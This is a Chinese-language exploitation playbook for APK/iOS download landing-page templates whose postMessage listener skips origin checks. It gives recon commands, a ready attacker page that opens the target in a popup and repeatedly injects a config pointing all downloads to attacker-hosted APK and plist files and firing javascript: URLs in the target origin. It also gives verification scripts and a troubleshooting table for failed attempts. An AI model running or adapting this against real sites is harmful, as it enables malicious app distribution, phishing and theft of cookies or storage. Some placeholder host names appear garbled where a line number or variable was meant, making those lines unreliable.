# 模板下载落地页：postMessage 无 origin/source 校验 → window.config 注入 → 同源 JS 执行 / 下载链接劫持

适用面：各类「APK / iOS plist / H5 落地页」模板站（单文件 `index.html`，inline JS，模板按 `/template/<id>/index.html` 或
`/template/<渠道>/<xx>/<ts>/index.html` 分发，多实例共用一个文件、ETag 相同）。托管常见 IIS / nginx。

## 0. 漏洞形状（先认清再动手）

典型代码（去敏后）：

```html
<script>
  // 第 ~42 行：先碰父文档 —— 跨源 iframe 会在这里抛 SecurityError
  var meta = window.parent.document.createElement("meta");
  ...
  window.config = { name: "...", defult_apk_url: "...", firm_apk_url_1: "...", firm_ios_url_1: "...",
                    cserviceUrl: "...", h5gameUrl: "...", open_app_link_android: "..." };

  window.addEventListener("message", function (event) {
      if (event.data.action === "config") {
          window.config = event.data.params;   // ← 无 event.origin / event.source 校验
          init();                              // ← 直接用攻击者值渲染
          generateQRImg();
      }
  });
</script>
```

两条独立的坑（都实测过）：

1. **监听无来源校验** —— 任意 origin 都能下发 config。
2. **但脚本在注册监听之前先访问 `window.parent.document`** —— 因此
   * 跨源 **iframe** 嵌入：第 42 行就抛 `SecurityError`，`init()` 不执行、**message 监听根本没注册**（此路不通）；
   * 跨源 `window.open` 打开的**顶层弹窗**：`parent === self`，不抛错，监听正常注册（**主路**）。

## 1. 侦察 / 判定是否有戏

```bash
curl -sk 'https://<target-host>/template/2/index.html' -o page.html
grep -n 'addEventListener("message"' page.html
grep -n 'window\.config'                page.html
grep -n 'location\.href'                page.html
```

判据：
- 找到 `event.data.action === "config"` 且函数体内**没有** `event.origin` / `event.source` 比较 → 命中。
- 再确认响应头**无** CSP、**无** X-Frame-Options（本例均无，嵌入限制只靠 `parent.document` 抛错）。
- 记下所有被 config 直接驱动的字段（下载直链、线路数组、客服链接、`open_app_link_*`），它们就是可控 sink。

## 2. 攻击者页（主路：window.open 顶层弹窗）

`poc_pop.html`（放在攻击者可控主机；**必须由用户点击**触发，规避 popup blocker）：

```html
<!doctype html><meta charset="utf-8"><title>poc</title>
<a id="go" href="#">click</a>
<script>
var TARGET = "https://<target-host>/template/2/index.html";
var PAYLOAD = {
  action: "config",
  params: {
    name: "PWNED",
    defult_apk_url: "https://attacker.example/evil.apk",
    firm_apk_url_1: "https://attacker.example/e1.apk",
    firm_ios_url_1: "https://attacker.example/i1.plist",
    cserviceUrl: "javascript:document.title='CS_XSS'",
    h5gameUrl: "https://attacker.example/h5?x=",
    open_app_link_android: 'javascript:void(document.title="XSSED_VIA_CONFIG")'
  }
};
document.getElementById("go").onclick = function () {
  var w = window.open(TARGET, "pocwin");     // 先拿句柄
  var tries = 0;
  var t = setInterval(function () {
    try { w.postMessage(PAYLOAD, "*"); } catch (e) {}   // targetOrigin 用 *
    if (++tries > 20) clearInterval(t);
  }, 250);
};
</script>
```

要点：
- `targetOrigin` 写 `"*"`；页面不会校验来源，写具体 origin 也行，但没有必要。
- **重投是关键**：页面加载未完成时投递会丢，用定时重投（本例 250ms × 20 次）。
- 打开后弹窗里下载按钮 / 「立即体验」按钮即指向攻击者资源；`customerServiceLink` 一类被点开即触发 `javascript:` sink。

## 3. 验证（CDP 取值，别只看表面渲染）

在弹窗上下文执行：

```js
JSON.stringify({
  title: document.title,
  cfg: window.config,
  apk: window.apk,
  firm_apk: window.firm_apk,
  firm_ios: window.firm_ios,
  cs: window.customerServiceLink,
  playNow: window.playNowLink,
  listeners: getEventListeners(window).message.length
})
```

命中回显（实测形态）：

```json
{"title":"PWNED","apk":"https://attacker.example/evil.apk",
 "firm_apk":["https://attacker.example/e1.apk"],
 "firm_ios":["https://attacker.example/i1.plist"],
 "cs":"javascript:document.title=\"CS_XSS\"",
 "playNow":"https://attacker.example/h5?x=<ts>&","listeners":1}
```

- `listeners === 1` 证明监听已注册且被我们的消息喂到。
- 下载链接全部变成攻击者 URL → **下载劫持（仿冒 APK / 恶意 plist）** 成立。

同源 JS 执行（利用页面自身的 sink，不需要额外 XSS 点）：

```
config.open_app_link_android = javascript:void(document.title="XSSED_VIA_CONFIG")
→ 页面 openOrDownloadApp() 执行 window.location.href = window.open_app_apk
→ document.title 变为 XSSED_VIA_CONFIG，location 仍为 https://<target-host>/template/2/index.html
```

即：**在目标源内执行任意 JS**（等价 XSS，只是入口是 postMessage 而非 URL 反射）。
注意 `javascript:` 只在被赋值给 `location.href` 时执行；若站点把该字段塞进 `window.open()` 或
`<a href>` 点击，同样生效，但 `img.src` 之类不会执行。

## 4. 对照组（写报告用，也用来解释为何不用 iframe）

`poc_frame.html`：

```html
<iframe id="f" src="https://<target-host>/template/2/index.html"></iframe>
<script>
setTimeout(function () {
  document.getElementById("f").contentWindow.postMessage(
    { action: "config", params: { name: "PWNED_FRAME" } }, "*");
}, 5000);
</script>
```

预期：

```
Uncaught DOMException: Blocked a frame with origin "https://<target-host>" from accessing
a cross-origin frame.   at target508.example.com:41
```

且 iframe 内 `window.config === undefined`（监听未注册）。这说明：
`window.parent.document` 那一行是现成的"防嵌入"副作用，**不是漏洞不存在**，换 `window.open` 即绕过。

## 5. 常见失败原因

| 现象 | 原因 / 处理 |
|---|---|
| iframe 里投递无效、config 未变 | 命中第 42 行 `parent.document` SecurityError，监听未注册 → 改用 `window.open` |
| `window.open` 返回 null | popup blocker；必须绑定在真实用户手势（click）里 |
| 句柄拿到但 config 没变 | 投递早于监听注册 / 页面还没解析完 → 定时重投，直到 `target509.example.com` 变化 |
| 改了 config 但页面没反应 | 只改了字段名，未调用到 `init()`/渲染函数；或该字段名不在模板里（先 dump 原始 `window.config` 全字段） |
| `javascript:` 没执行 | 被赋给的不是导航 sink（`location.href`/`window.open`/`a.href` 点击）；或站点加了 CSP |
| 目标站点已修 | 新版本会在监听体里加 `event.origin !== location.origin && return`，或删掉 config 消息通道 —— 此时该点作废 |

## 6. 影响与定级

- 前置：攻击者能托管页面 + 受害者点击一次（`window.open` 需手势）。
- 后果：仿冒 APK / plist 分发（供应链式投毒）、客服/体验链接劫持到钓鱼站、目标源内任意 JS（可读该源下 localStorage/Cookie，取决于站点在该域存了什么）。
- 实测定级 high；若该落地页同源下还有后台/会话态，可升级为 critical。
